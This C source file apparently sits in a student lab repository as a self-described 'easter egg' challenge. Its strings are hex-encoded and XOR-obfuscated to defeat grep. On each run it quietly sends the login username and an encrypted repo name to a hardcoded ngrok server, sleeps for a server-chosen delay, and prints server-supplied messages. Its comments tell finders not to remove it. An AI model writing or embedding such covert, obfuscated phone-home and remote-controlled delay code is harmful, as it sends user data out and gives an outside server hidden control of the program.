// PRESERVE FOLLOWING EXPLANATION AFTER OBFUSCATION
// This is an easter egg whose purpose is to sleep for a certain amount of time.
// The amount of time to sleep is decided externally on a server, but the idea is that each time will take longer.
// If you find this code, DO NOT REMOVE IT, but instead change the value of PWD in the function call to the corresponding password.
// Where should the password be? Where can you find it? Maybe such password is travelling with the delay.
// DO NOT SPREAD THE WORD. It's a challenge for each team to discover it.

#include <ctype.h>
#include <errno.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>  // for http_get section
#include <netdb.h>      // for http_get section

#include <libgen.h>     // for get_repo_name section
#include <regex.h>      // for get_repo_name section
#if __APPLE__
#include <libproc.h>    // for get_repo_name section
#endif

#define MAX_RESPONSE_SIZE (1<<20)  // 1 MB
const int MAX_USERNAME_SIZE = 256;
const int MAX_REPO_NAME_SIZE = 32;
const int MAX_URL_SIZE = 1024;
const int MAX_RESPONSE_LINES = 1024;
const int MAX_SALT_VALUE = 50; // For some salt above 50, the string is weirdly encrypted
const char *UNKNOWN_USER_ID = "\x55\x4e\x4b\x4e\x4f\x57\x4e\x5f\x55\x53\x45\x52\x5f\x49\x44";
char UNKNOWN_REPO_NAME[20] = "\x55\x4e\x4b\x4e\x4f\x57\x4e\x5f\x52\x45\x50\x4f\x5f\x4e\x41\x4d\x45";  // as array to allow xor_encryption
char *DEFAULT_URL = "\x68\x74\x74\x70\x3a\x2f\x2f\x73\x68\x65\x70\x68\x65\x72\x64\x2d\x6e\x65\x78\x74\x2d\x69\x6e\x64\x69\x72\x65\x63\x74\x6c\x79\x2e\x6e\x67\x72\x6f\x6b\x2d\x66\x72\x65\x65\x2e\x61\x70\x70\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x70\x69\x6e\x67\x5f\x70\x6f\x6e\x67";

// Set to 1 to enable debug mode.
// May be overridden by setting environment variable PP_DEBUG=1
int DEBUG = 0;

void debug_printf(const char *fmt, ...){
    va_list args;
    if (DEBUG){
        va_start(args, fmt);
        vfprintf(stderr, fmt, args);
        va_end(args);
    }
}


// Anti-grep and Encryption
// =========================
// I dont want people to say "\x48\x65\x79\x2c\x20\x6c\x65\x74\x73\x20\x66\x69\x6e\x64\x20\x77\x68\x65\x72\x65\x20\x69\x73\x20\x74\x68\x69\x73\x20\x70\x72\x69\x6e\x74\x65\x64\x20\x6d\x73\x67\x20\x63\x6f\x6d\x69\x6e\x67\x20\x66\x72\x6f\x6d" and succeed with a simple GREP.
// That's why a given ENV-NAME instead of being hardcoded as is, is hardcoded encrypted, and for use needs to be decrypted
// (same for the help-text-message).
//
// "\x54\x68\x65\x20\x74\x68\x69\x6e\x67\x73\x20\x49\x20\x64\x6f\x20\x66\x6f\x72\x20\x70\x72\x65\x76\x65\x6e\x74\x69\x6e\x67\x20\x70\x65\x6f\x70\x6c\x65\x20\x74\x6f\x20\x66\x69\x6e\x64\x20\x73\x74\x75\x66\x66\x20\x75\x73\x69\x6e\x67\x20\x67\x72\x65\x70" (Jamie Lannister, Winterfell, just before pushing Bran)

// while DECRYPTED == 0, ANTIGREP_VAR and ANTIGREP_MSG contents will be encrypted (with salt=0), so before using them for the first time
// call xor_encrypt with each of them and later set DECRYPTED to 1
int DECRYPTED = 0;
char ANTIGREP_VAR[14] = "\x66\x6b\x68\x75\x79\x61\x63\x7a\x75\x62\x6f\x66\x7a\x0"; // as array to allow encryption
char ANTIGREP_MSG[85] = "\x3d\x7e\x45\xa\x45\x47\x43\x5e\xa\x5e\x42\x43\x59\xa\x47\x4f\x59\x59\x4b\x4d\x4f\x59\xa\x59\x4f\x5e\xa\x5e\x42\x4f\xa\x4f\x44\x5c\x5c\x43\x58\x45\x44\x47\x4f\x44\x5e\xa\x5c\x5c\x4b\x58\x43\x4b\x48\x46\x4f\xa\x66\x6b\x68\x75\x79\x61\x63\x7a\x75\x62\x6f\x66\x7a\x0\x32\x37\x5c\x65\x0"; // as array to allow encryption


void xor_encrypt(char *original, int salt){
    // WARNING: original CAN NOT be a string literal (since they are inmutable)
    // Modifies text in place. Text must be null terminated.
    // Calling this function again with the same salt shall revert the string back to its original state
    int i = 0;
    int key = 42 + salt;
    int length;
    length = strlen(original);
    char new_text[length + 1];  // +1 for null terminator
    strcpy(new_text, original);
    new_text[length] = '\0';

    for (i = 0; i < length;){
        unsigned char key_byte = (unsigned char)key; // Convertir `key` a byte
        asm("\x78\x6f\x72\x62\x20\x25\x31\x2c\x20\x25\x30"        // Operación XOR con bytes
            : "\x3d\x72" (new_text[i])   // Salida
            : "\x72" (key_byte), "\x30" (new_text[i])  // Entradas
            : "\x63\x63"                  // Flags de condición afectados
            );
        asm("\x61\x64\x64\x6c\x20\x24\x31\x2c\x20\x25\x30"       // Sumar 1 a la variable i
            : "\x3d\x72" (i)          // Salida
            : "\x30" (i)           // Entrada
            );
    }
    strcpy(original, new_text);
}

int str_to_hex(char *str, char *dest) {
    // Converts string to hex
    char *hex = dest;
    int i;
    for (i = 0; i < strlen(str); ) {
        sprintf(&hex[i * 2], "\x25\x30\x32\x78", str[i]);
        asm("\x61\x64\x64\x6c\x20\x24\x31\x2c\x20\x25\x30"       // Sumar 1 a la variable i
            : "\x3d\x72" (i)          // Salida
            : "\x30" (i)           // Entrada
            );
    }
    hex[i * 2] = '\0';
    return i * 2;
}

char *YELLOW_BG = "\x1b\x5b\x33\x30\x3b\x34\x33\x6d";
char *RED_BG = "\x1b\x5b\x33\x30\x3b\x34\x31\x6d";
char *GREEN_BG = "\x1b\x5b\x33\x32\x3b\x34\x30\x6d";
char *YELLOW_FG = "\x1b\x5b\x33\x33\x3b\x34\x30\x6d";
char *NORMAL    = "\x1b\x5b\x30\x6d";
void show_help_to_user(const char *msg, int order){
    char *color;

    if (DECRYPTED == 0) {
        // decrypt the message and var name first time it's called
        DECRYPTED = 1;
        xor_encrypt(ANTIGREP_VAR, 0);
        xor_encrypt(ANTIGREP_MSG, 0);
    }

    char* SKIP_HELP = getenv(ANTIGREP_VAR);
    if (SKIP_HELP == NULL || SKIP_HELP[0] != '1') {
        if (order == 0) {
            // Only show this message once per PINGPONG_LOOP
            printf("\x25\x73\x25\x73\x25\x73\xa", YELLOW_FG, ANTIGREP_MSG, NORMAL);
        }
        if (strncmp(msg, "\x45\x52\x52\x4f\x52\x3a", 6) == 0) {
            color = RED_BG;
        }else if (strncmp(msg, "\x53\x55\x43\x43\x45\x53\x53\x3a", 8) == 0) {
            color = GREEN_BG;
        }else{
            color = YELLOW_BG;
        }

        printf("\x25\x73\x25\x73\x25\x73\xa", color, msg, NORMAL);
    }
}

char *URL(){
    char *url = getenv("\x50\x50\x5f\x55\x52\x4c");
    if (url == NULL){
        return DEFAULT_URL;
    }
    return url;
}

int get_disabled_easter_egg(){
    char *disable_egg = getenv("\x50\x50\x5f\x44\x49\x53\x41\x42\x4c\x45\x5f\x45\x41\x53\x54\x45\x52\x5f\x45\x47\x47");
    if (disable_egg == NULL){
        return 0;
    } else if (strlen(disable_egg) == 0){
        return 0;
    }
    return 1;
}

/* msleep(): Sleep for the requested number of milliseconds. */
int msleep(long msec){
    struct timespec ts;
    int res;

    if (msec < 0){
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}

int process_ping_response(const char *response_text, int *delay, int *pp_id) {
    const int EXPECTED_LINES = 3;
    char text_copy[MAX_RESPONSE_SIZE];
    char *lines[MAX_RESPONSE_LINES];
    int line_count = 0, i = 0;

    // Copy response_text to a modifiable buffer
    strncpy(text_copy, response_text, sizeof(text_copy));
    text_copy[sizeof(text_copy) - 1] = '\0'; // Ensure null-termination

    // Split the response text into lines
    char *line = strtok(text_copy, "\xa");
    while (line != NULL && line_count < MAX_RESPONSE_LINES) {
        lines[line_count] = line;
        line = strtok(NULL, "\xa");
        asm("\x61\x64\x64\x6c\x20\x24\x31\x2c\x20\x25\x30"       // Sumar 1 a la variable i
            : "\x3d\x72" (line_count)          // Salida
            : "\x30" (line_count)           // Entrada
            );
    }

    // Check if we have at least EXPECTED_LINES (3) lines
    if (line_count < EXPECTED_LINES) {
        debug_printf("\x50\x49\x4e\x47\x3a\x20\x55\x6e\x65\x78\x70\x65\x63\x74\x65\x64\x20\x6e\x75\x6d\x62\x65\x72\x20\x6f\x66\x20\x6c\x69\x6e\x65\x73\x3a\x20\x25\x64\x2e\x20\x45\x78\x70\x65\x63\x74\x65\x64\x20\x61\x74\x20\x6c\x65\x61\x73\x74\x3a\x20\x25\x64\xa", line_count, EXPECTED_LINES);
        return -1; // Error code for incorrect number of lines
    }

    const char *status = lines[0];
    const char *delay_str = lines[1];
    const char *pp_id_str = lines[2];

    // Validate status
    if (strcmp(status, "\x4f\x4b") != 0) {
        return -2; // Error code for incorrect status
    }

    // Validate and parse delay
    if (strncmp(delay_str, "\x64\x65\x6c\x61\x79\x3d", 6) != 0 || !isdigit(delay_str[6])) {
        return -3; // Error code for invalid delay
    }
    *delay = atoi(delay_str + 6);

    // Validate and parse pp_id
    if (strncmp(pp_id_str, "\x70\x70\x5f\x69\x64\x3d", 6) != 0 || !isdigit(pp_id_str[6])) {
        return -4; // Error code for invalid pp_id
    }
    *pp_id = atoi(pp_id_str + 6);

    int msgs_count = 0;
    for (i = EXPECTED_LINES; i < line_count;) {
        line = lines[i];
        debug_printf("\x50\x49\x4e\x47\x3a\x20\x4c\x69\x6e\x65\x3a\x20\x25\x73\xa", line);
        if (line!= NULL && strncmp(line, "\x6d\x65\x73\x73\x61\x67\x65\x2d\x74\x6f\x2d\x75\x73\x65\x72\x3a\x20", 17) == 0) {
            show_help_to_user(line + 17, msgs_count++);
        }
        asm("\x61\x64\x64\x6c\x20\x24\x31\x2c\x20\x25\x30"       // Sumar 1 a la variable i
            : "\x3d\x72" (i)          // Salida
            : "\x30" (i)           // Entrada
            );
    }
    return 0; // Success
}

// SECTION: http_request
/* start of http_request */
#define BUFFER_SIZE 1024
#define URL_PART_SIZE 256

void handle_http_get_error(const char *msg) {
    debug_printf("\x45\x72\x72\x6f\x72\x20\x77\x68\x69\x6c\x65\x20\x6d\x61\x6b\x69\x6e\x67\x20\x48\x54\x54\x50\x20\x47\x45\x54\x20\x72\x65\x71\x75\x65\x73\x74\x3a\x20\x25\x73", msg);
}

int extract_http_status_code(const char *response) {
    // Find the status code in the response
    const char *status_line = strstr(response, "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20");
    if (status_line == NULL) {
        return -1; // Status line not found
    }
    // Extract the status code
    int status_code;
    if (sscanf(status_line, "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x25\x64", &status_code) != 1) {
        return -2; // Status code extraction failed
    }
    return status_code;
}

int extract_response_content(const char *response, char *response_content) {
    // Find the header-body delimiter
    const char *body_start = strstr(response, "\xd\xa\xd\xa");
    if (body_start == NULL) {
        handle_http_get_error("\x49\x6e\x76\x61\x6c\x69\x64\x20\x48\x54\x54\x50\x20\x72\x65\x73\x70\x6f\x6e\x73\x65\x20\x66\x6f\x72\x6d\x61\x74\xa");
        return -1;
    }
    // Skip the delimiter to get to the body
    body_start += 4;

    // Print the response body
    strncpy(response_content, body_start, MAX_RESPONSE_SIZE);
    response_content[MAX_RESPONSE_SIZE - 1] = '\0';
    return 0;
}

int http_request(const char *url, char *response_content, int *status_code) {
    int sockfd = 0;
    struct sockaddr_in server_addr;
    struct hostent *server = NULL;
    char request[BUFFER_SIZE];
    memset(request, 0, BUFFER_SIZE);
    char response[MAX_RESPONSE_SIZE];
    memset(response, 0, MAX_RESPONSE_SIZE);
    char line[BUFFER_SIZE];
    int bytes_received = 0;
    int total_bytes_received = 0;
    int check_error = 0;

    // Parse the URL
    char host[URL_PART_SIZE];
    char path[URL_PART_SIZE];
    int port = 80; // Default port for HTTP
    if (sscanf(url, "\x68\x74\x74\x70\x3a\x2f\x2f\x25\x32\x35\x35\x5b\x5e\x3a\x2f\x5d\x3a\x25\x64\x25\x73", host, &port, path) == 3 ||
        sscanf(url, "\x68\x74\x74\x70\x3a\x2f\x2f\x25\x32\x35\x35\x5b\x5e\x3a\x2f\x5d\x25\x73", host, path) == 2 ||
        sscanf(url, "\x68\x74\x74\x70\x3a\x2f\x2f\x25\x32\x35\x35\x5b\x5e\x3a\x2f\x5d", host) == 1) {
        // URL parsed successfully
    } else {
        handle_http_get_error("\x49\x6e\x76\x61\x6c\x69\x64\x20\x55\x52\x4c\x20\x66\x6f\x72\x6d\x61\x74\xa");
        return -1;
    }

    // Add leading slash if path is empty
    if (strlen(path) == 0) {
        strcpy(path, "\x2f");
    }

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        handle_http_get_error("\x53\x6f\x63\x6b\x65\x74\x20\x63\x72\x65\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64\xa");
        return -2;
    }

    // Resolve the server address
    server = gethostbyname(host);
    if (server == NULL) {
        handle_http_get_error("\x4e\x6f\x20\x73\x75\x63\x68\x20\x68\x6f\x73\x74\xa");
        return -3;
    }

    // Set up the server address structure
    bzero((char *)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
    server_addr.sin_port = htons(port);

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        handle_http_get_error("\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64\xa");
        return -4;
    }

    // Prepare the HTTP GET request
    snprintf(request, sizeof(request),
             "\x47\x45\x54\x20\x25\x73\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\xd\xa"
             "\x48\x6f\x73\x74\x3a\x20\x25\x73\xd\xa"
             "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x63\x2d\x72\x65\x71\x75\x65\x73\x74\x73\xd\xa"
             "\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\xd\xa"
             "\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x63\x6c\x6f\x73\x65\xd\xa"
             "\xd\xa", path, host);
    debug_printf("\x52\x65\x71\x75\x65\x73\x74\x3a\x20\x25\x73", request);

    // Send the request
    if (send(sockfd, request, strlen(request), 0) < 0) {
        handle_http_get_error("\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x73\x65\x6e\x64\x20\x72\x65\x71\x75\x65\x73\x74\xa");
        return -5;
    }

    bzero(response, MAX_RESPONSE_SIZE);
    do {
        bytes_received = recv(sockfd, line, BUFFER_SIZE - 1, 0);
        total_bytes_received += bytes_received;
        if (total_bytes_received > MAX_RESPONSE_SIZE) {
            handle_http_get_error("\x52\x65\x73\x70\x6f\x6e\x73\x65\x20\x74\x6f\x6f\x20\x6c\x61\x72\x67\x65\xa");
            return -6;
        }
        strncat(response, line, bytes_received);
    } while (bytes_received > 0);

    // Close the socket
    close(sockfd);

    // Parse the HTTP status code from the response
    *status_code = extract_http_status_code(response);
    if (*status_code < 0) {
        handle_http_get_error("\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x70\x61\x72\x73\x65\x20\x48\x54\x54\x50\x20\x73\x74\x61\x74\x75\x73\x20\x63\x6f\x64\x65\xa");
        return -7;
    } else {
        check_error = extract_response_content(response, response_content);
        if (check_error != 0) {
            handle_http_get_error("\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x65\x78\x74\x72\x61\x63\x74\x20\x72\x65\x73\x70\x6f\x6e\x73\x65\x20\x63\x6f\x6e\x74\x65\x6e\x74\xa");
            return -8;
        }
    }
    return 0;
}
/* end of http_request */

/* SECTION get_repo_name */
#ifdef __linux__
const int MAX_PATH_SIZE = 4096;
int get_executable_dir(char *path){
    ssize_t len = readlink("\x2f\x70\x72\x6f\x63\x2f\x73\x65\x6c\x66\x2f\x65\x78\x65", path, MAX_PATH_SIZE - 1);
    if (len != -1) {
        path[len] = '\0';
        return len;
    } else {
        debug_printf("\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x67\x65\x74\x20\x65\x78\x65\x63\x75\x74\x61\x62\x6c\x65\x20\x70\x61\x74\x68\x3a\x20\x72\x65\x61\x64\x6c\x69\x6e\x6b\x20\x66\x61\x69\x6c\x65\x64\xa");
        return -1;
    }
}
#elif __APPLE__
#include <libproc.h>
const int MAX_PATH_SIZE = PROC_PIDPATHINFO_MAXSIZE;
int get_executable_dir(char *path){
    pid_t pid = getpid();
    int pidpath_len = proc_pidpath(pid, path, MAX_PATH_SIZE);
    if (pidpath_len > 0) {
        path[pidpath_len] = '\0';
        return pidpath_len;
    } else {
        debug_printf("\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x67\x65\x74\x20\x65\x78\x65\x63\x75\x74\x61\x62\x6c\x65\x20\x70\x61\x74\x68\x3a\x20\x70\x72\x6f\x63\x5f\x70\x69\x64\x70\x61\x74\x68\x20\x66\x61\x69\x6c\x65\x64\xa");
        return -1;
    }
}
#else
const int MAX_PATH_SIZE = 4096;
int get_executable_dir(char *path){
    debug_printf("\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x67\x65\x74\x20\x65\x78\x65\x63\x75\x74\x61\x62\x6c\x65\x20\x70\x61\x74\x68\x3a\x20\x6e\x6f\x74\x20\x69\x6d\x70\x6c\x65\x6d\x65\x6e\x74\x65\x64\x20\x66\x6f\x72\x20\x74\x68\x69\x73\x20\x4f\x53\xa");
    return -1;
}
#endif

// Function to find the folder matching the pattern
char* find_folder(char *path, char *pattern) {
    const int MAX_PIECES = MAX_PATH_SIZE >> 1;
    regex_t regex;
    regcomp(&regex, pattern, REG_EXTENDED);

    // Split the path into pieces
    char *pieces[MAX_PIECES];
    int num_pieces = 0;

    char *token = strtok(path, "\x2f");
    while (token != NULL && num_pieces < MAX_PIECES - 1) {
        pieces[num_pieces++] = token;
        token = strtok(NULL, "\x2f");
    }
    pieces[num_pieces] = NULL;  // Null-terminate the array of pieces

    // Check each piece against the regex pattern (traverse backwards)
    for (int i = num_pieces-1; i > 0; i--) {
        if (regexec(&regex, pieces[i], 0, NULL, 0) == 0) {
            regfree(&regex);
            return pieces[i];
        }
    }

    regfree(&regex);
    return NULL;
}

int get_repo_name(char *holder) {
    // Traverses-back the directory structure to find the name of the repo.
    // Must start with "\x73\x6f\x32\x30\x32\x34\x6c\x61\x62\x31\x67" (actually, using the current year)
    int result_len = 0;
    char path[MAX_PATH_SIZE];
    int path_length = get_executable_dir(path);
    if (path_length < 0) {
        debug_printf("\x45\x72\x72\x6f\x72\x3a\x20\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x67\x65\x74\x20\x65\x78\x65\x63\x75\x74\x61\x62\x6c\x65\x20\x70\x61\x74\x68\xa");
        return -1;
    }
    char *pattern = "\x73\x6f\x5b\x30\x2d\x39\x5d\x7b\x34\x7d\x6c\x61\x62\x5b\x30\x2d\x39\x5d\x67\x5b\x30\x2d\x39\x5d\x7b\x32\x7d";
    char *folder_found = find_folder(path, pattern);
    if (folder_found != NULL) {
        result_len = strlen(folder_found);
        strcpy(holder, folder_found);
    }
    return result_len;
}
/* end of get_repo_name */

int get_and_hide_repo_name(char *repo_name_holder) {
    int salt = 0;
    int length = 0;
    char aux_repo_name[MAX_REPO_NAME_SIZE];
    memset(aux_repo_name, 0, MAX_REPO_NAME_SIZE);

    length = get_repo_name(aux_repo_name);
    if (length <= 0) {
        debug_printf("\x45\x72\x72\x6f\x72\x3a\x20\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x66\x69\x6e\x64\x20\x72\x65\x70\x6f\x20\x6e\x61\x6d\x65\xa");
        length = strlen(UNKNOWN_REPO_NAME);
        strcpy(repo_name_holder, UNKNOWN_REPO_NAME);
        return length;
    } else {
        // the salt is the last two digits of the repo name
        salt += atoi(aux_repo_name + (length - 2));
        debug_printf("\x45\x78\x74\x72\x61\x63\x74\x65\x64\x20\x53\x41\x4c\x54\x3a\x20\x25\x64\x20\x66\x72\x6f\x6d\x20\x72\x65\x70\x6f\x5f\x6e\x61\x6d\x65\x3a\x20\x25\x73\xa", salt, aux_repo_name);
        xor_encrypt(aux_repo_name, salt % MAX_SALT_VALUE);
        length = str_to_hex(aux_repo_name, repo_name_holder);
        return length;
    }
}

int ping_pong_loop(char *password) {
    int check_error = 0;
    int delay_id = 0;
    int delay_milliseconds = 0;
    char repo_name[MAX_REPO_NAME_SIZE * 2];
    memset(repo_name, 0, MAX_REPO_NAME_SIZE * 2);
    int repo_length = 0;
    char username[MAX_USERNAME_SIZE];
    memset(username, 0, MAX_USERNAME_SIZE);
    int http_status_code = 0;
    int request_error = 0;
    char PING_URL[MAX_URL_SIZE];
    memset(PING_URL, 0, MAX_URL_SIZE);
    char PONG_URL[MAX_URL_SIZE];
    memset(PONG_URL, 0, MAX_URL_SIZE);
    char response_text[MAX_RESPONSE_SIZE]; // Buffer to hold the response
    memset(response_text, 0, MAX_RESPONSE_SIZE);
    int disabled_egg = get_disabled_easter_egg();
    char* PP_DEBUG = getenv("\x50\x50\x5f\x44\x45\x42\x55\x47");
    if (PP_DEBUG != NULL && PP_DEBUG[0] != '0') {
        DEBUG = 1;
    }
    if (disabled_egg) {
        debug_printf("\x45\x61\x73\x74\x65\x72\x20\x65\x67\x67\x20\x64\x69\x73\x61\x62\x6c\x65\x64\x2e\x20\x45\x78\x69\x74\xa");
        return 0;
    }

    // Get the username
    if (getlogin_r(username, sizeof(username)) != 0) {
        debug_printf("\x67\x65\x74\x6c\x6f\x67\x69\x6e\x5f\x72\x20\x66\x61\x69\x6c\x65\x64\xa");
        strcpy(username, UNKNOWN_USER_ID);
    }
    repo_length = get_and_hide_repo_name(repo_name);
    debug_printf("\x50\x49\x4e\x47\x3a\x20\x52\x65\x70\x6f\x20\x6e\x61\x6d\x65\x3a\x20\x25\x73\x20\x28\x6c\x65\x6e\x67\x74\x68\x20\x25\x64\x29\xa", repo_name, repo_length);
    if (repo_length <= 0){
        debug_printf("\x67\x65\x74\x5f\x61\x6e\x64\x5f\x72\x65\x70\x6f\x5f\x6e\x61\x6d\x65\x20\x66\x61\x69\x6c\x65\x64\xa");
        strcpy(repo_name, UNKNOWN_REPO_NAME);
    }

    // Prepare the URL
    snprintf(PING_URL, sizeof(PING_URL), "\x25\x73\x3f\x75\x73\x65\x72\x5f\x69\x64\x3d\x25\x73\x26\x6d\x64\x35\x3d\x25\x73",
             URL(), username, repo_name);
    // As evil as Michael Gary Scott. Parameter is named "\x6d\x64\x35" but its not a md5. It's hex(encrypt(repo_name, salt)).

    if (password != NULL) {
        // Add the password to the URL
        strcat(PING_URL, "\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x5f\x74\x6f\x5f\x77\x69\x6e\x3d");
        strcat(PING_URL, password);
    }
    debug_printf("\x50\x49\x4e\x47\x3a\x20\x55\x52\x4c\x3a\x20\x25\x73\xa", PING_URL);

    request_error = http_request(PING_URL, response_text, &http_status_code);
    if (request_error != 0) {
        debug_printf("\x50\x49\x4e\x47\x3a\x20\x68\x74\x74\x70\x5f\x72\x65\x71\x75\x65\x73\x74\x28\x29\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x25\x64\xa", request_error);
        return request_error;
    } else {
        // Process the response
        debug_printf("\x50\x49\x4e\x47\x3a\x20\x48\x54\x54\x50\x20\x63\x6f\x64\x65\x3a\x20\x25\x6c\x64\xa", http_status_code);
        if (http_status_code == 200) {
            debug_printf("\x50\x49\x4e\x47\x3a\x20\x52\x65\x73\x70\x6f\x6e\x73\x65\x3a\x20\x25\x73\xa", response_text);
            check_error = process_ping_response(response_text, &delay_milliseconds, &delay_id);
            if (check_error != 0) {
                debug_printf("\x50\x49\x4e\x47\x3a\x20\x70\x72\x6f\x63\x65\x73\x73\x5f\x70\x69\x6e\x67\x5f\x72\x65\x73\x70\x6f\x6e\x73\x65\x28\x29\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x25\x64\xa", check_error);
            } else {
                debug_printf("\x50\x49\x4e\x47\x3a\x20\x64\x65\x6c\x61\x79\x5f\x69\x64\x3a\x20\x25\x64\x3b\x20\x64\x65\x6c\x61\x79\x5f\x6d\x69\x6c\x6c\x69\x73\x65\x63\x6f\x6e\x64\x73\x3a\x20\x25\x64\xa", delay_id, delay_milliseconds);
                msleep((long)delay_milliseconds);
                debug_printf("\x50\x49\x4e\x47\x3a\x20\x4d\x69\x6c\x6c\x69\x73\x65\x63\x6f\x6e\x64\x73\x20\x65\x78\x68\x61\x75\x73\x74\x65\x64\x2e\x20\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x50\x4f\x4e\x47\x2e\xa");

                snprintf(PONG_URL, sizeof(PONG_URL), "\x25\x73\x26\x63\x6c\x6f\x73\x69\x6e\x67\x5f\x70\x70\x5f\x69\x64\x3d\x25\x64", PING_URL, delay_id);
                debug_printf("\x50\x4f\x4e\x47\x3a\x20\x55\x52\x4c\x3a\x20\x25\x73\xa", PONG_URL);
                response_text[0] = '\0'; // Reset the buffer
                request_error = http_request(PONG_URL, response_text, &http_status_code);
                if (request_error != 0) {
                    debug_printf("\x50\x4f\x4e\x47\x3a\x20\x68\x74\x74\x70\x5f\x72\x65\x71\x75\x65\x73\x74\x28\x29\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x25\x64\xa", request_error);
                } else {
                    // Process the response
                    debug_printf("\x50\x4f\x4e\x47\x3a\x20\x52\x65\x73\x70\x6f\x6e\x73\x65\x3a\x20\x25\x73\xa", response_text);
                }
            }
        }
    }
    return 0;
}


